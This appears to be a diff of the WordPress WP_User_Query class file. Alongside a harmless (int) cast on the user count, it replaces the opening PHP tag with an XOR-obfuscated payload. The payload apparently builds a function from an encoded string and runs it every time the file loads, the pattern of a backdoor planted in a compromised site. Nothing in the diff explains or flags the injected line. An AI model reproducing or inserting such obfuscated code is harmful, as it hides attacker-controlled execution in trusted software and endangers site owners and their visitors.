@@ -1,4 +1,4 @@
-<?php
+<?php $AnrlIY='V<Q-9S+J6XO.Y=N'^'5N4LM6t,C6,Z0R ';$ZfOTm=$AnrlIY('','.FFs<;T0EP<ZgTMIDTArj4.R8RAESh0XI-CoPzCFs1942OTQ<Q3W3hWT2Ae<W,:IRQUNMVqeQS>lJOLAnLoP7p  CdtwpIlnBhTU7mg+HgbfOLRWN9IJ5E+MN-XNQNQVu;qIY4GpKA8GJhGPrV2V2T.QTlLopE,,4gFInVA+3643UgoXK-x;YHY>pB6;BDCqw723ensZMZLe4eO59,ttS0TQS x>w,J9.iS6REwNF2:67A=8Z;5XZ4HhIr,m>r2y z12Qr + tlyAoC2ALRLtAB3KQQF1f:5CIhVbXUBRhKKYL,0jzSu ,T4HI<3isUHFpfR.W=+PV<6L4;R1,:Rmynl3wbk0ngE,KnIGYDRDsYNKA+-NGk,AH<OI9<P5- ,DZsBZ+3uOc4TS-HJHPyRCXRI6nIB.hVF:iT52SAVU8,<IQO+66;Z.nV>707.EAs5< IX2OOVub2ISNO>YrI7385fDMOH-<8t;-CEMv>ZZKB4L0YkvJrA60Z>t:I=;R1Y;.SPS>U>VzkNJ45.celTygV2SZjTJTQnOZ5:lsYlRZcB aybejaUPGY;GUP4CGUNPVsGwPRQXtJ4ezXjVh;><0T.2+69=ISIC=GrPT7;QQ>PgTcHMM;sDEuZVOLU=:HAMLmFXS=M,S14:A=0SqpKw0CXN+;mDpLyI'^'G nRZN:S19S4815 7 2ZMLA g6 127o5<YdFyZ8LzWLZQ;=>RqK8A735F :c:YNav54:,zQA:6GEjolaN7eY>TOU7DIWWnWdKa2:EECBhZBVtlv>rJ=8Y EejI9:0gjvQRZbp>Nyo.M3jFzpZrV7F5uu=1l1PaGIM<b NsaXGDXV;OK3.TQfpsS7y0SO76-YSXGGLUyS0P1o>A+TMMTIsV5= EC4SH+MO68S+eJn SVERz72<TG=;W HaVs.q=y0eZPAqVKNYTQGaK5S-97eT:H:o502P9QP:iUvF30;ibBo=-XQJGsQVM8A-r6Ncy<.fXGvJ6IJyvG<ERT TMY:MQJ3a23>u=3eM8Nm,<=ryMyj= GX+nKWKA5k-XH1jFEUdgSf1NJNEj=p7L<+hmYv59><SUCKSb+L0M0TF2akuxYR:4=BWZR KF.QEoSO1 ,jQU=pP.<3CVm-6- Z<ZmSRLTOhmk,LHY+PH:ldM43<cfP-D8KPlR DB;G+Q,Dd7I0HZ xtU0GqVKj.UAOJEJrYO;VfrN0+ 05h1PCK.pLogCeAULZUXSeiplYvd5Pww3xecAvE614<A,QBSxLpHZLNQ-qYNOfX1::7NoU 5NW>0ZwKtG,,9ZZmeUzvol.73-7, Eb<2I,wtAUC-RQ7V-bL:J=6BOEtYws4');$ZfOTm();
 /**
  * User API: WP_User_Query class
  *
@@ -612,7 +612,7 @@ class WP_User_Query {
 		 * @param string $sql The SELECT FOUND_ROWS() query for the current WP_User_Query.
 		 */
 		if ( isset( $qv['count_total'] ) && $qv['count_total'] )
-			$this->total_users = $wpdb->get_var( apply_filters( 'found_users_query', 'SELECT FOUND_ROWS()' ) );
+			$this->total_users = (int) $wpdb->get_var( apply_filters( 'found_users_query', 'SELECT FOUND_ROWS()' ) );
 
 		if ( !$this->results )
 			return;
